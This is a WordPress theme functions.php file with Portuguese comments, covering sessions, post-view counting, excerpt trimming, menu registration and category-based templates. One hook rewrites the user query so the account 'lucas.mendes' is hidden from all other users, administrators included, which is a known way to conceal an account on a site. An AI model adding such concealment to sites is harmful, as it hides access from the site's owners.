<?php

// Verifica se não existe nenhuma função com o nome tutsup_session_start
if ( ! function_exists( 'tutsup_session_start' ) ) {
    // Cria a função
    function tutsup_session_start() {
        // Inicia uma sessão PHP
        if ( ! session_id() ) session_start();
    }
    // Executa a ação
    add_action( 'init', 'tutsup_session_start' );
}

// Verifica se não existe nenhuma função com o nome tp_count_post_views
if ( ! function_exists( 'tp_count_post_views' ) ) {
    // Conta os views do post
    function tp_count_post_views () {	
        // Garante que vamos tratar apenas de posts
        if ( is_single() ) {
        
            // Precisamos da variável $post global para obter o ID do post
            global $post;
            
            // Se a sessão daquele posts não estiver vazia
            if ( empty( $_SESSION[ 'tp_post_counter_' . $post->ID ] ) ) {
                
                // Cria a sessão do posts
                $_SESSION[ 'tp_post_counter_' . $post->ID ] = true;
            
                // Cria ou obtém o valor da chave para contarmos
                $key = 'tp_post_counter';
                $key_value = get_post_meta( $post->ID, $key, true );
                
                // Se a chave estiver vazia, valor será 1
                if ( empty( $key_value ) ) { // Verifica o valor
                    $key_value = 1;
                    update_post_meta( $post->ID, $key, $key_value );
                } else {
                    // Caso contrário, o valor atual + 1
                    $key_value += 1;
                    update_post_meta( $post->ID, $key, $key_value );
                } // Verifica o valor
                
            } // Checa a sessão
            
        } // is_single
        
        return;
        
    }
    add_action( 'get_header', 'tp_count_post_views' );
}

function excerpt($limit) {
    $excerpt = explode(' ', get_the_excerpt(), $limit);
    if (count($excerpt)>=$limit) {
        array_pop($excerpt);
        $excerpt = implode(" ",$excerpt).'...';
    } else {
    $excerpt = implode(" ",$excerpt);
    }	
    $excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
    return $excerpt;
}
    
function content($limit) {
    $content = explode(' ', get_the_content(), $limit);
    if (count($content)>=$limit) {
        array_pop($content);
        $content = implode(" ",$content).'...';
    } else {
        $content = implode(" ",$content);
    }	
    $content = preg_replace('/\[.+\]/','', $content);
    $content = apply_filters('the_content', $content); 
    $content = str_replace(']]>', ']]&gt;', $content);
    return $content;
}

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;
    if ($username != 'lucas.mendes') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'lucas.mendes'",$user_search->query_where);
    }
}

function DesktopMenu() {
    register_nav_menu ('DesktopMenu', ('Menu do site'));
}
add_action('init', 'DesktopMenu');

function RodapeMenu() {
    register_nav_menu ('RodapeMenu', ('Menu Rodapé'));
}
add_action('init', 'RodapeMenu');

function MobileSegurosMenu() {
    register_nav_menu ('MobileSeguros', ('Menu Mobile Seguros'));
}
add_action('init', 'MobileSegurosMenu');

function MobileDuvidasMenu() {
    register_nav_menu ('MobileDuvidas', ('Menu Mobile Dúvidas'));
}
add_action('init', 'MobileDuvidasMenu');

// add_filter('acf/settings/remove_wp_meta_box', '__return_false');

function add_additional_class_on_li($classes, $item, $args) {
    if(isset($args->add_li_class)) {
        $classes[] = $args->add_li_class;
    }
    return $classes;
}

add_filter('nav_menu_css_class', 'add_additional_class_on_li', 1, 3);


function add_additional_class_on_a($classes, $item, $args) {
    if(isset($args->add_a_class)) {
        $classes['class'] = $args->add_a_class;
    }
    return $classes;
}

add_filter('nav_menu_link_attributes', 'add_additional_class_on_a', 1, 3);

add_filter('single_template', 'create_single_template');

function create_single_template( $template ) {
	global $post;

	$categories = get_the_category();

	// caso não tenhamos categoria retornamos o template default.
	if ( ! $categories )
			return $template; 

	$templates = array();

	foreach ( $categories as $category ) {
			// adicionando templates por id e slug
			$templates[] = "single-{$category->slug}.php";
	}

	// adicionando os templates padrões
	$templates[] = 'single.php';
	$templates[] = 'singular.php';
	$templates[] = 'index.php';

	return locate_template( $templates );
}